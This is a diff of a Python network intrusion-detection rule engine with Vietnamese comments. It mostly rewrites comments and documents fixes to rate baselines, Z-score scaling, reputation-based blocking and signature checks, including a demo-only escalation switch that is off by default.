 # nghĩa, nên ngưỡng thực thi không bao giờ thấp hơn 2 req/s. Phần thích nghi vẫn còn nguyên
@@ -561,7 +559,7 @@ class SessionBaseline:
     Theo dõi behavioral baseline cho mỗi Source IP.
     Phát hiện APT bằng statistical deviation thay vì random sampling.
 
-    CHỐNG REDIS/RAM OOM:
+    Chống REDIS/RAM OOM:
       Cơ chế Sliding Window TTL: IP sessions inactive quá ttl_seconds
       sẽ tự động bị evict. Đảm bảo RAM không cạn kiệt khi chạy.
     """
@@ -585,12 +583,12 @@ class SessionBaseline:
         )
         self.deviation_threshold = deviation_threshold
         self.window_seconds = window_seconds
-        self.ttl_seconds = ttl_seconds  # IP inactive > TTL → evict
+        self.ttl_seconds = ttl_seconds  # IP im lặng quá TTL -> loại khỏi bộ nhớ
         self.max_profiles = max_profiles
         self.eviction_interval = eviction_interval
         self.global_avg_request_rate = 1.0
-        # Tổng và số hạng của trung bình toàn cục — giữ lại để trừ được phần đóng góp của
-        # chính hồ sơ đang xét (so với NGƯỜI KHÁC, không so với chính mình).
+        # Tổng và số hạng của trung bình toàn cục - giữ lại để trừ được phần đóng góp của
+        # chính hồ sơ đang xét (so với người khác, không so với chính mình).
         self._rate_sum = 0.0
         self._rate_n = 0
         self._update_counter = 0  # Đếm để trigger eviction định kỳ
@@ -616,7 +614,7 @@ class SessionBaseline:
     def update(self, source_ip: str, log_entry: dict) -> dict:
         """
         Cập nhật baseline cho IP và trả về deviation score.
-        GHI NHẬN TOÀN BỘ traffic, evict stale profiles định kỳ.
+        Ghi nhận toàn bộ traffic, evict stale profiles định kỳ.
         """
         # Kiểm soát kích thước cache để chống tấn công cạn kiệt trạng thái (State Exhaustion)
         if source_ip not in self.profiles and len(self.profiles) >= self.max_profiles:
@@ -670,26 +668,26 @@ class SessionBaseline:
 
         # Indicator 2: High-frequency requests (so với global average)
         #
-        # ── MỘT YÊU CẦU KHÔNG PHẢI LÀ MỘT TỐC ĐỘ (vá 2026-08-17) ─────────────────────
-        # `elapsed` bị kẹp sàn 1 giây, nên một IP LẦN ĐẦU xuất hiện luôn được chấm
-        # `1 / 1 = 1,00 req/s` — không phải đo được, mà do công thức sinh ra. Cùng lúc,
-        # `update_global_baseline()` lấy trung bình tốc độ của MỌI hồ sơ, mà phần lớn hồ sơ
+        # một yêu cầu không phải là một tốc độ (vá 2026-08-17)
+        # `elapsed` bị kẹp sàn 1 giây, nên một IP lần đầu xuất hiện luôn được chấm
+        # `1 / 1 = 1,00 req/s` - không phải đo được, mà do công thức sinh ra. Cùng lúc,
+        # `update_global_baseline()` lấy trung bình tốc độ của mọi hồ sơ, mà phần lớn hồ sơ
         # là IP chỉ gửi đúng một yêu cầu rồi già đi (tốc độ tiến dần về 0). Trung bình vì
-        # thế TỤT dần xuống dưới 0,5, kéo ngưỡng `avg × 2` xuống quanh 1,0 — đúng bằng con
-        # số mà mọi IP mới bị gán. Kết quả: MỌI địa chỉ lần đầu xuất hiện đều vượt ngưỡng.
+        # thế tụt dần xuống dưới 0,5, kéo ngưỡng `avg × 2` xuống quanh 1,0 - đúng bằng con
+        # số mà mọi IP mới bị gán. Kết quả: Mọi địa chỉ lần đầu xuất hiện đều vượt ngưỡng.
         #
-        # Đo trên hai lượt chạy 17/08/2026, hai hình dạng dữ liệu NGƯỢC NHAU nhưng cùng hỏng:
+        # Đo trên hai lượt chạy 17/08/2026, hai hình dạng dữ liệu ngược nhau nhưng cùng hỏng:
         #   * hồ IP hẹp (142 yêu cầu/IP)  -> "3,00 req/s (ngưỡng 1,00)" ngay ở yêu cầu thứ 3
         #   * hồ IP rộng (1 yêu cầu/IP)   -> "1,00 req/s (ngưỡng 0,50)" ngay ở yêu cầu đầu
-        # Trải dữ liệu kiểu nào cũng dính, vì lỗi nằm ở CÔNG THỨC chứ không ở lưu lượng.
+        # Trải dữ liệu kiểu nào cũng dính, vì lỗi nằm ở công thức chứ không ở lưu lượng.
         #
-        # Sửa: chưa đủ mẫu thì KHÔNG kết luận gì về tốc độ. Cần ít nhất `_MIN_RATE_SAMPLES`
-        # yêu cầu mới được chấm — đúng nguyên tắc "không đo được thì không phán".
+        # Sửa: chưa đủ mẫu thì không kết luận gì về tốc độ. Cần ít nhất `_MIN_RATE_SAMPLES`
+        # yêu cầu mới được chấm - đúng nguyên tắc "không đo được thì không phán".
         elapsed = max(now - profile["first_seen"], 1)
         request_rate = profile["request_count"] / elapsed
-        # SO VỚI NGƯỜI KHÁC, KHÔNG SO VỚI CHÍNH MÌNH. Trung bình toàn cục có tính cả hồ sơ
-        # đang xét, nên khi chỉ một IP gửi dồn thì trung bình BẰNG tốc độ của chính nó và
-        # `rate > avg × 2` không bao giờ đúng — chỉ báo chết lặng đúng lúc cần nhất. Trừ
+        # So với người khác, không so với chính mình. Trung bình toàn cục có tính cả hồ sơ
+        # đang xét, nên khi chỉ một IP gửi dồn thì trung bình bằng tốc độ của chính nó và
+        # `rate > avg × 2` không bao giờ đúng - chỉ báo chết lặng đúng lúc cần nhất. Trừ
         # phần đóng góp của chính nó ra (xấp xỉ: tốc độ có thể đã nhích từ lần cập nhật
         # trước, sai số đó nhỏ hơn nhiều so với việc tự so với mình).
         if self._rate_n > 1:
@@ -707,7 +705,7 @@ class SessionBaseline:
                 f"(ngưỡng bình thường: {_normal:.2f})"
             )
 
-        # Indicator 3: Abnormal packet volume
+        # Dấu hiệu 3: lưu lượng gói bất thường
         if profile["request_count"] > 0:
             avg_packets = profile["total_fwd_packets"] / profile["request_count"]
             if avg_packets > 500:
@@ -723,15 +721,15 @@ class SessionBaseline:
             "request_count": profile["request_count"],
             "unique_ports": len(profile["unique_ports"]),
             "is_anomalous": deviation_score > 0,
-            "active_profiles": len(self.profiles),  # Metric cho monitoring
+            "active_profiles": len(self.profiles),  # Chỉ số phục vụ giám sát
         }
 
     def update_global_baseline(self):
-        """Cập nhật global average request rate từ các IP profiles ĐỦ MẪU.
+        """Cập nhật global average request rate từ các IP profiles đủ mẫu.
 
-        Hồ sơ một-yêu-cầu KHÔNG được vào trung bình. Tốc độ của chúng là hiện vật của công
+        Hồ sơ một-yêu-cầu không được vào trung bình. Tốc độ của chúng là hiện vật của công
         thức (`1 / elapsed` với `elapsed` kẹp sàn 1 giây), không phải phép đo. Gộp chúng
-        vào khiến trung bình tụt dần theo thời gian chạy — ngưỡng `avg × 2` trôi xuống
+        vào khiến trung bình tụt dần theo thời gian chạy - ngưỡng `avg × 2` trôi xuống
         quanh 1,0, đúng bằng giá trị mà mọi IP mới bị gán, nên mọi IP mới đều vượt ngưỡng.
         """
         if not self.profiles:
@@ -755,7 +753,7 @@ class SessionBaseline:
 
 class RuleEngine:
     """
-    Tier 1 Rule Engine — Bộ lọc thông minh (KHÔNG random).
+    Tier 1 Rule Engine - Bộ lọc thông minh (không random).
 
     Luồng xử lý mỗi log entry:
       1. Static Rules: Kiểm tra port nhạy cảm, volumetric attack
@@ -792,24 +790,24 @@ class RuleEngine:
 
         self.whitelist_ips = set(tier1_config.get("whitelist_ips", []))
 
-        # --- DÀN DỰNG DEMO: tiền tố IP được leo thang thay vì chặn khi khớp chữ ký WAF ---
-        # MẶC ĐỊNH RỖNG = TẮT HẲN, không đổi một bit hành vi nào. Chỉ buổi trình diễn mới
-        # điền, và chỉ điền dải IP mà KHÔNG tập benchmark nào dùng (đã đối chiếu demo.json /
+        # Dàn dựng DEMO: tiền tố IP được leo thang thay vì chặn khi khớp chữ ký WAF
+        # Mặc định rỗng = tắt hẳn, không đổi một bit hành vi nào. Chỉ buổi trình diễn mới
+        # điền, và chỉ điền dải IP mà không tập benchmark nào dùng (đã đối chiếu demo.json /
         # datatest.json / csic.json / ground_truth.json). Xem nhánh dùng nó ở `evaluate`.
         self.demo_escalate_prefixes = tuple(
             str(p) for p in (tier1_config.get("demo_escalate_waf_prefixes") or [])
         )
 
-        # --- Reputation-based enforcement (tiền sử IP từ Threat Memory) ---
-        # IP đã có "hồ sơ đen": điểm danh tiếng >= block_threshold -> Tier-1 CHẶN NGAY
-        # (không tốn LLM); >= hitl_threshold -> AWAIT_HITL (đưa lên analyst) DÙ gói hiện
+        # Reputation-based enforcement (tiền sử IP từ Threat Memory)
+        # IP đã có "hồ sơ đen": điểm danh tiếng >= block_threshold -> Tier-1 chặn ngay
+        # (không tốn LLM); >= hitl_threshold -> AWAIT_HITL (đưa lên analyst) dù gói hiện
         # tại trông lành. Đây là "known-bad short-circuit": kẻ đã bị chứng minh xấu không
-        # cần escalate lại. Có thể TẮT bằng reputation_enforcement=false.
+        # cần escalate lại. Có thể tắt bằng reputation_enforcement=false.
         self.reputation_enforcement = tier1_config.get("reputation_enforcement", True)
         self.reputation_block_threshold = tier1_config.get("reputation_block_threshold", 70)
         self.reputation_hitl_threshold = tier1_config.get("reputation_hitl_threshold", 50)
-        # Cache reputation trong RAM (TTL ngắn) để GIỮ Tier-1 ở tốc độ đường truyền —
-        # tránh truy vấn SQLite cho MỖI log; IP lặp lại chỉ tốn O(1) trong burst.
+        # Cache reputation trong RAM (TTL ngắn) để giữ Tier-1 ở tốc độ đường truyền -
+        # tránh truy vấn SQLite cho mỗi log; IP lặp lại chỉ tốn O(1) trong burst.
         self._rep_cache: dict[str, tuple[float, float]] = {}
         self._rep_cache_ttl = tier1_config.get("reputation_cache_ttl", 5.0)
         # Chặn rò RAM: khi cache đầy (nhiều IP khác nhau) sẽ dọn các mục đã hết hạn.
@@ -829,7 +827,7 @@ class RuleEngine:
             eviction_interval=baseline_config.get("eviction_interval", 100),
         )
 
-        # Prompt injection & jailbreak: các mẫu là CHUỖI THUẦN (không có metachar regex).
+        # Prompt injection & jailbreak: các mẫu là chuỗi thuần (không có metachar regex).
         # Trước đây compile thành regex `re.escape(p)` -> mỗi log quét tới 19 mẫu × 8 field
         # bằng regex engine. Giờ so khớp SUBSTRING không phân biệt hoa/thường (nhanh hơn
         # nhiều, kết quả & text lý do y hệt vì mẫu vốn là literal). Giữ list gốc để hiện
@@ -857,13 +855,13 @@ class RuleEngine:
         self.total_processed_logs = 0
 
         # Seed baseline từ hồ sơ 'golden' (benign đã kiểm định) nếu bật trong config;
-        # sau đó baseline vẫn cập nhật online CÓ ĐIỀU KIỆN (chỉ DROP/LOG) như bình thường.
+        # sau đó baseline vẫn cập nhật online có điều kiện (chỉ DROP/LOG) như bình thường.
         self._seed_golden_baseline(tier1_config)
 
     def _seed_golden_baseline(self, tier1_config: dict) -> None:
         """Nạp golden baseline (trạng thái Welford của lưu lượng benign đã kiểm định)
-        vào global_stats nếu được bật trong config. Mặc định TẮT để tương thích ngược.
-        Sau khi seed, baseline vẫn cập nhật online CÓ ĐIỀU KIỆN (chỉ DROP/LOG)."""
+        vào global_stats nếu được bật trong config. Mặc định tắt để tương thích ngược.
+        Sau khi seed, baseline vẫn cập nhật online có điều kiện (chỉ DROP/LOG)."""
         gb = tier1_config.get("golden_baseline", {}) if isinstance(tier1_config, dict) else {}
         if not (isinstance(gb, dict) and gb.get("enabled")):
             return
@@ -883,8 +881,8 @@ class RuleEngine:
         except (OSError, ValueError) as exc:
             print(f"[Tier-1] Không đọc được golden baseline ({exc}); bỏ qua.")
             return
-        # CHỐT AN TOÀN: baseline dựng ở thang TUYẾN TÍNH mà nạp vào code tính Z ở thang LOG
-        # (hoặc ngược lại) thì mọi Z-score đều sai — và sai IM LẶNG, không có triệu chứng gì
+        # Chốt an toàn: baseline dựng ở thang tuyến tính mà nạp vào code tính Z ở thang LOG
+        # (hoặc ngược lại) thì mọi Z-score đều sai - và sai im lặng, không có triệu chứng gì
         # ngoài việc số liệu trở nên vô nghĩa. Từ chối nạp thay vì suy biến âm thầm.
         _file_tf = str(profile.get("transform", "")) if isinstance(profile, dict) else ""
         if _file_tf != BASELINE_TRANSFORM_ID:
@@ -912,7 +910,7 @@ class RuleEngine:
             )
 
     def learn_baseline(self, log_entry: dict) -> None:
-        """Cập nhật baseline Welford KHÔNG điều kiện từ một bản ghi benign đã kiểm định.
+        """Cập nhật baseline Welford không điều kiện từ một bản ghi benign đã kiểm định.
         Dùng OFFLINE để dựng golden baseline (mọi mẫu đều đã biết là sạch), khác với
         đường runtime vốn chỉ cập nhật với phán quyết DROP/LOG."""
         for key, aliases in _RAW_TO_CANONICAL.items():
@@ -924,13 +922,13 @@ class RuleEngine:
                         parsed = float(log_entry[alias])
                     except (ValueError, TypeError):
                         continue
-                    # LỌC Inf/NaN: CICIDS có `Flow Pkts/s = Inf` khi Flow Duration = 0.
-                    # Đường evaluate đã lọc từ trước, đường HỌC thì chưa — một giá trị Inh
-                    # lọt vào Welford làm mean/M2 thành NaN VĨNH VIỄN và giết luôn đặc trưng
+                    # Lọc Inf/NaN: CICIDS có `Flow Pkts/s = Inf` khi Flow Duration = 0.
+                    # Đường evaluate đã lọc từ trước, đường học thì chưa - một giá trị Inh
+                    # lọt vào Welford làm mean/M2 thành NaN vĩnh viễn và giết luôn đặc trưng
                     # đó (quan sát thật: golden baseline có Flow Pkts/s = nan).
                     if math.isinf(parsed) or math.isnan(parsed):
                         break
-                    # scale_feature: PHẢI khớp với phía tính Z (xem evaluate) — nếu
+                    # scale_feature: Phải khớp với phía tính Z (xem evaluate) - nếu
                     # học ở thang này mà chấm ở thang kia thì Z-score vô nghĩa.
                     self.global_stats[key].push(scale_feature(key, parsed))
                     break
@@ -951,14 +949,12 @@ class RuleEngine:
         ngay tại Tier-1 nhằm bảo vệ Tier-2 khỏi bị nghẽn (Resource Starvation).
 
         Thân hàm nằm ở `match_waf_family` (mức module) vì Tier-2 cũng cần đúng phép so khớp
-        này — xem giải thích ở đó.
+        này - xem giải thích ở đó.
         """
         return match_waf_family(log_entry)
 
     def _check_injection_signatures(self, log_entry: dict) -> str | None:
-        """
-        Kiểm tra các mẫu Prompt Injection và Jailbreak từ config hệ thống ngay tại Tier-1.
-        """
+        """Kiểm tra các mẫu Prompt Injection và Jailbreak từ config hệ thống ngay tại Tier-1."""
         target_fields = [
             "payload",
             "uri",
@@ -972,7 +968,7 @@ class RuleEngine:
         for field in target_fields:
             val = log_entry.get(field) or log_entry.get(field.lower())
             if val and isinstance(val, str):
-                # CÙNG lý do với `_check_waf_signatures`: mẫu tiêm nhiễm mã hoá URL/thực thể
+                # Cùng lý do với `_check_waf_signatures`: mẫu tiêm nhiễm mã hoá URL/thực thể
                 # HTML sẽ lọt nếu chỉ so trên chuỗi nguyên văn.
                 for cand in normalize_for_signature(val):
                     val_lc = cand.lower()
@@ -993,8 +989,8 @@ class RuleEngine:
     def _get_reputation_score(self, ip: str) -> float:
         """Lấy điểm danh tiếng của IP từ Threat Memory (có cache TTL để giữ Tier-1 nhanh).
 
-        AN TOÀN TUYỆT ĐỐI: mọi lỗi truy vấn/DB chưa sẵn sàng -> trả 0.0. Tier-1 KHÔNG
-        BAO GIỜ được sập chỉ vì tra cứu bộ nhớ dài hạn.
+        An toàn tuyệt đối: mọi lỗi truy vấn/DB chưa sẵn sàng -> trả 0.0. Tier-1 không
+        Bao giờ được sập chỉ vì tra cứu bộ nhớ dài hạn.
         """
         if not ip or ip == "unknown":
             return 0.0
@@ -1039,36 +1035,36 @@ class RuleEngine:
         score = 0
         reasons = []
 
-        # Chuan hoa key: ho tro ca CICIDS CSV format va normalized JSON format
+        # Chuẩn hoá khoá: nhận cả định dạng CSV của CICIDS lẫn JSON đã chuẩn hoá
         for alias, canonical in _KEY_ALIASES.items():
             if alias in log_entry and canonical not in log_entry:
                 log_entry[canonical] = log_entry[alias]
 
-        # --- Tầng 0: Whitelist Check (ĐÁNH DẤU — KHÔNG return sớm) ---
-        # IP whitelist VẪN được phân tích ĐẦY ĐỦ ở Tier-1 (chữ ký WAF/injection, Z-score,
-        # luật tĩnh/động, baseline...) để analyst QUAN SÁT hành vi — nhưng hành động cuối
-        # LUÔN bị ép về WHITELIST_DROP: CHO QUA, KHÔNG chặn / không escalate / không HITL /
+        # Tầng 0: Whitelist Check (đánh dấu - không return sớm)
+        # IP whitelist vẫn được phân tích đầy đủ ở Tier-1 (chữ ký WAF/injection, Z-score,
+        # luật tĩnh/động, baseline...) để analyst quan sát hành vi - nhưng hành động cuối
+        # luôn bị ép về WHITELIST_DROP: Cho qua, không chặn / không escalate / không HITL /
         # miễn trừ reputation. Nhờ vậy lần chạy thứ 2 vẫn hiện "kiểu tấn công + suy luận"
         # như log thường (chỉ khác: không bị chặn) thay vì bị nuốt lặng ở Tầng 0.
         source_ip = log_entry.get("Source IP", "unknown")
         is_whitelisted = source_ip in self.whitelist_ips
         log_entry["is_whitelisted"] = is_whitelisted
 
-        # --- Tầng 0.1: WAF Signature Check (Chống LLM Starvation) ---
+        # Tầng 0.1: WAF Signature Check (Chống LLM Starvation)
         waf_reason = self._check_waf_signatures(log_entry)
         has_waf_match = bool(waf_reason)
         if waf_reason:
             score += 50
             reasons.append(waf_reason)
 
-        # --- Tầng 0.2: Prompt Injection / Jailbreak Signature Check ---
+        # Tầng 0.2: Prompt Injection / Jailbreak Signature Check
         injection_reason = self._check_injection_signatures(log_entry)
         has_injection_match = bool(injection_reason)
         if injection_reason:
             score += 50
             reasons.append(injection_reason)
 
-        # --- Tầng 0.5: Kiểm tra Unsupervised Statistical Anomaly ---
+        # Tầng 0.5: Kiểm tra Unsupervised Statistical Anomaly
         self.total_processed_logs += 1
 
         # Ánh xạ các trường mạng thô sang các nhóm tính năng
@@ -1100,7 +1096,7 @@ class RuleEngine:
 
                 # Bỏ qua nếu dữ liệu không biến động (std quá bé)
                 if std_val > 0.01:
-                    # Tính Z trong CÙNG không gian mà baseline đã học (xem scale_feature):
+                    # Tính Z trong cùng không gian mà baseline đã học (xem scale_feature):
                     # đặc trưng khối-lượng/thời-lượng/tốc-độ được log1p hoá để Z-score không
                     # còn giả định sai về phân phối Gauss trên dữ liệu lệch đuôi.
                     z_score = abs(scale_feature(key, val) - mean_val) / std_val
@@ -1109,8 +1105,8 @@ class RuleEngine:
                         # Điểm phạt tăng dần theo độ lệch, cap ở 40
                         penalty = min(int(z_score * 5), 40)
                         z_anomaly_score += penalty
-                        # Hiển thị giá trị THÔ (dễ đọc cho analyst) nhưng Z tính ở thang đã
-                        # biến đổi — nêu rõ để người audit không hiểu nhầm phép tính.
+                        # Hiển thị giá trị thô (dễ đọc cho analyst) nhưng Z tính ở thang đã
+                        # biến đổi - nêu rõ để người audit không hiểu nhầm phép tính.
                         _scaled_note = " · thang log" if key in LOG_SCALE_FEATURES else ""
                         z_anomaly_reasons.append(
                             f"Phát hiện dị biệt thống kê Zero-day [{key}]: Giá trị {val:.1f} "
@@ -1122,7 +1118,7 @@ class RuleEngine:
             score += z_anomaly_score
             reasons.extend(z_anomaly_reasons)
 
-        # --- Tầng 1: Static Rules ---
+        # Tầng 1: Static Rules
         dest_port = log_entry.get("Destination Port", -1)
         fwd_packets = log_entry.get("Total Fwd Packets", 0)
 
@@ -1140,9 +1136,9 @@ class RuleEngine:
         except (ValueError, TypeError):
             pass
 
-        # --- Tầng 2: Dynamic Rules (Từ Feedback Loop) ---
-        # dynamic_ip_block: luật Source-IP ĐÃ được Analyst DUYỆT (HITL) khớp CHÍNH XÁC ->
-        # Tier-1 TỰ CHẶN ngay lần tái phạm, KHÔNG cần leo thang Tier-2 (đây là "Tier-1 học được").
+        # Tầng 2: Dynamic Rules (Từ Feedback Loop)
+        # dynamic_ip_block: luật Source-IP đã được Analyst duyệt (HITL) khớp chính xác ->
+        # Tier-1 tự chặn ngay lần tái phạm, không cần leo thang Tier-2 (đây là "Tier-1 học được").
         dynamic_ip_block = False
 
         # O(1) lookup cho luật chặn IP
@@ -1159,7 +1155,7 @@ class RuleEngine:
                     score += rule_score
                     reasons.append(f"Luật động [từ Tác tử]: {rule_field}='{rule_pattern}'")
 
-        # --- Tầng 3: Session Baseline ---
+        # Tầng 3: Session Baseline
         source_ip = log_entry.get("Source IP", "unknown")
         baseline_result = self.session_baseline.update(source_ip, log_entry)
 
@@ -1167,9 +1163,9 @@ class RuleEngine:
             score += baseline_result["deviation_score"]
             reasons.extend(baseline_result["deviation_reasons"])
 
-        # --- Tầng 3.5: Reputation Enforcement (tiền sử IP) ---
-        # Kẻ ĐÃ bị chứng minh xấu không cần escalate lại: chặn/HITL ngay theo hồ sơ danh
-        # tiếng, ĐỘC LẬP với điểm gói hiện tại (gói lành từ IP xấu vẫn bị nâng cấp).
+        # Tầng 3.5: Reputation Enforcement (tiền sử IP)
+        # Kẻ đã bị chứng minh xấu không cần escalate lại: chặn/HITL ngay theo hồ sơ danh
+        # tiếng, độc lập với điểm gói hiện tại (gói lành từ IP xấu vẫn bị nâng cấp).
         rep_action = None
         if self.reputation_enforcement and not is_whitelisted:
             rep_score = self._get_reputation_score(source_ip)
@@ -1186,7 +1182,7 @@ class RuleEngine:
                     f"{self.reputation_hitl_threshold}) → đẩy lên Cổng ML (Tier-1) / LLM (Tier-2)"
                 )
 
-        # --- Đánh giá & Phân luồng Action (Tier 1 Action Differentiation) ---
+        # Đánh giá & Phân luồng Action (Tier 1 Action Differentiation)
         log_entry["tier1_score"] = score
         log_entry["tier1_reasons"] = reasons
         log_entry["tier1_z_score"] = max_z_score
@@ -1196,12 +1192,12 @@ class RuleEngine:
         }
 
         if is_whitelisted:
-            # IP whitelist: ĐÃ phân tích đầy đủ ở trên (score + reasons giữ nguyên để
-            # analyst quan sát) nhưng LUÔN cho qua — ưu tiên CAO NHẤT, đè mọi nhánh chặn.
+            # IP whitelist: Đã phân tích đầy đủ ở trên (score + reasons giữ nguyên để
+            # analyst quan sát) nhưng luôn cho qua - ưu tiên cao nhất, đè mọi nhánh chặn.
             log_entry["tier1_action"] = "WHITELIST_DROP"
         elif rep_action == "BLOCK_IP":
-            # Tiền sử NGUY HIỂM (reputation >= ngưỡng block): CHẶN NGAY, ĐỘC LẬP với điểm
-            # gói hiện tại — kẻ đã bị chứng minh xấu không cần escalate lại, không tốn LLM.
+            # Tiền sử nguy hiểm (reputation >= ngưỡng block): Chặn ngay, độc lập với điểm
+            # gói hiện tại - kẻ đã bị chứng minh xấu không cần escalate lại, không tốn LLM.
             log_entry["tier1_action"] = "BLOCK_IP"
             log_entry["tier1_block_evidence"] = "reputation"
         elif score >= self.risk_threshold:
@@ -1222,8 +1218,8 @@ class RuleEngine:
             # không cần quét lại danh sách reasons (nhanh hơn + không phụ thuộc text lý do).
 
             if dynamic_ip_block:
-                # IP đã được Analyst DUYỆT chặn (HITL -> luật ACTIVE): Tier-1 TỰ CHẶN ngay,
-                # KHÔNG tốn LLM. Ưu tiên CAO NHẤT — kẻ tái phạm không cần leo thang lại.
+                # IP đã được Analyst duyệt chặn (HITL -> luật ACTIVE): Tier-1 tự chặn ngay,
+                # không tốn LLM. Ưu tiên cao nhất - kẻ tái phạm không cần leo thang lại.
                 log_entry["tier1_action"] = "BLOCK_IP"
                 log_entry["tier1_block_evidence"] = "dynamic_rule"
             elif (
@@ -1231,17 +1227,17 @@ class RuleEngine:
                 and has_waf_match
                 and str(source_ip).startswith(self.demo_escalate_prefixes)
             ):
-                # DÀN DỰNG CHO BUỔI DIỄN — KHÔNG phải hành vi mặc định. Xem
-                # `tier1.demo_escalate_waf_prefixes` trong config (mặc định RỖNG = tắt hẳn).
+                # Dàn dựng cho buổi diễn - không phải hành vi mặc định. Xem
+                # `tier1.demo_escalate_waf_prefixes` trong config (mặc định rỗng = tắt hẳn).
                 #
-                # Vì sao cần: đo được trên lượt chạy 2026-08-03 — Tier-1 tự giải quyết
-                # 1.894/2.000 sự kiện CSIC (94,7%), và TOÀN BỘ 357 mẫu có mã kỹ thuật đều
+                # Vì sao cần: đo được trên lượt chạy 2026-08-03 - Tier-1 tự giải quyết
+                # 1.894/2.000 sự kiện CSIC (94,7%), và toàn bộ 357 mẫu có mã kỹ thuật đều
                 # dính lớp chữ ký WAF ngay tại đây. Hệ quả: trong 203 sự kiện CSIC lọt lên
-                # Tier-2 có ĐÚNG 0 mẫu mang mã kỹ thuật -> màn hình không bao giờ hiện được
+                # Tier-2 có đúng 0 mẫu mang mã kỹ thuật -> màn hình không bao giờ hiện được
                 # năng lực quy kết, dù năng lực ấy có thật.
                 #
-                # Núm này chỉ đổi ĐÍCH ĐẾN (chặn -> leo thang), KHÔNG đổi phán quyết và
-                # KHÔNG chạm dữ liệu. Nó lọc theo tiền tố IP nên chỉ với tay tới đúng dải
+                # Núm này chỉ đổi đích đến (chặn -> leo thang), không đổi phán quyết và
+                # không chạm dữ liệu. Nó lọc theo tiền tố IP nên chỉ với tay tới đúng dải
                 # dàn dựng; mọi tập benchmark không có IP nào thuộc dải đó.
                 log_entry["tier1_action"] = "ESCALATE"
                 reasons.append("[DÀN DỰNG DEMO] chữ ký WAF -> leo thang thay vì chặn")
@@ -1252,23 +1248,23 @@ class RuleEngine:
                 # Prompt Injection / Jailbreak: gửi lên Tier-2 xử lý
                 log_entry["tier1_action"] = "ESCALATE"
             elif dest_port_val in self.sensitive_ports and fwd_pkts_val < 200:
-                # BruteForce: port nhạy cảm, packet count trung bình → block IP
+                # BruteForce: port nhạy cảm, packet count trung bình -> block IP
                 #
-                # BẰNG CHỨNG YẾU — CHỈ SUY TỪ LUỒNG. Nhánh này không đọc nội dung gói: nó chỉ
+                # Bằng chứng yếu - chỉ suy từ luồng. Nhánh này không đọc nội dung gói: nó chỉ
                 # thấy "cổng nhạy cảm + số gói vừa phải". Trong một mạng LAN thật thì SMB (445),
-                # SSH (22), RDP (3389), MSSQL (1433) là lưu lượng nội bộ BÌNH THƯỜNG, nên nhánh
+                # SSH (22), RDP (3389), MSSQL (1433) là lưu lượng nội bộ bình thường, nên nhánh
                 # này bắn nhầm vào máy trạm lành là chuyện thường tình, không phải ngoại lệ.
                 #
-                # Vì vậy phán quyết ở đây là NGĂN CHẶN TẠM THỜI (blacklist Redis TTL 1 giờ),
-                # KHÔNG được nâng thành hồ sơ danh tiếng vĩnh viễn. `subscriber` đọc nhãn này
+                # Vì vậy phán quyết ở đây là ngăn chặn tạm thời (blacklist Redis TTL 1 giờ),
+                # không được nâng thành hồ sơ danh tiếng vĩnh viễn. `subscriber` đọc nhãn này
                 # để phân biệt; xem chú thích tại nhánh BLOCK_IP ở đó.
                 log_entry["tier1_action"] = "BLOCK_IP"
                 log_entry["tier1_block_evidence"] = "heuristic_flow_port"
             elif fwd_pkts_val > self.max_fwd_packets:
-                # DoS/DDoS: volumetric → alert không block (có thể distributed)
+                # DoS/DDoS: volumetric -> alert không block (có thể distributed)
                 log_entry["tier1_action"] = "ALERT"
             elif dest_port_val not in self.sensitive_ports and dest_port_val not in [80, 443, 8080]:
-                # Lateral movement / Infiltration: unusual port, moderate score → ESCALATE
+                # Di chuyển ngang / thâm nhập: cổng lạ, điểm trung bình -> ESCALATE
                 log_entry["tier1_action"] = "ESCALATE"
             else:
                 log_entry["tier1_action"] = "ESCALATE"
@@ -1276,20 +1272,20 @@ class RuleEngine:
             log_entry["tier1_action"] = "DROP" if not reasons else "LOG"
 
         # Sàn Escalate theo tiền sử: IP đáng ngờ (reputation >= ngưỡng HITL) mà gói hiện tại
-        # chưa đủ mạnh -> NÂNG lên ESCALATE cho Tier-2 xem, thay vì lặng lẽ DROP/LOG.
+        # chưa đủ mạnh -> nâng lên ESCALATE cho Tier-2 xem, thay vì lặng lẽ DROP/LOG.
         if rep_action == "ESCALATE" and log_entry["tier1_action"] in ("DROP", "LOG"):
             log_entry["tier1_action"] = "ESCALATE"
 
-        # --- Tầng 0.6: Cập nhật RunningStats CHỈ với dữ liệu được coi là benign (DROP hoặc LOG) ---
+        # Tầng 0.6: Cập nhật RunningStats chỉ với dữ liệu được coi là benign (DROP hoặc LOG)
         # Điều này chống Baseline Poisoning (tấn công Slow-Rate baseline drift)
         #
-        # scale_feature BẮT BUỘC ở đây — cùng không gian với phía TÍNH Z (xem Tầng 0.5) và với
-        # learn_baseline/golden baseline. TRƯỚC ĐÂY dòng này push giá trị THÔ trong khi Z được
-        # tính ở thang log1p: baseline log-space bị bơm giá trị tuyến tính nên phương sai NỔ và
+        # scale_feature bắt buộc ở đây - cùng không gian với phía tính Z (xem Tầng 0.5) và với
+        # learn_baseline/golden baseline. Trước đây dòng này push giá trị thô trong khi Z được
+        # tính ở thang log1p: baseline log-space bị bơm giá trị tuyến tính nên phương sai nổ và
         # mọi Z-score sụp về ~0 -> Welford mù với chính các đặc trưng khối-lượng/thời-lượng nó
         # sinh ra để canh. Đo thật: sau 150 log benign, sd của `Flow Duration` đi từ 5.26 lên
-        # 120.669 (23.000 lần) và Z của một zero-day exfil tụt từ 4.58 xuống 0.07. Hỏng ÂM THẦM
-        # — không exception, chỉ là số liệu mất hết ý nghĩa.
+        # 120.669 (23.000 lần) và Z của một zero-day exfil tụt từ 4.58 xuống 0.07. Hỏng âm thầm
+        # - không exception, chỉ là số liệu mất hết ý nghĩa.
         if log_entry["tier1_action"] in ("DROP", "LOG"):
             for key, val in current_values.items():
                 if key in self.global_stats:
@@ -1299,7 +1295,7 @@ class RuleEngine:
 
     def reload_dynamic_rules(self):
         """
-        Hot-reload dynamic rules, whitelists, thresholds, and configurations từ YAML config.
+        Nạp nóng luật động, whitelist và ngưỡng từ tệp cấu hình YAML.
         Chỉ tải các luật đã phê duyệt (status == 'ACTIVE').
         """
         config = load_config()
@@ -1335,11 +1331,11 @@ class RuleEngine:
                 else:
                     self.dynamic_behavioral_rules.append((field, pattern, r.get("score", 50)))
 
-        # Hot-reload injection & jailbreak patterns (substring — xem _set_signature_patterns)
+        # Nạp nóng mẫu tiêm nhiễm và vượt rào (khớp chuỗi con - xem _set_signature_patterns)
         self.config = config
         self._set_signature_patterns(config.get("guardrails", {}))
 
-        # Hot-reload SessionBaseline parameters without wiping profiles cache
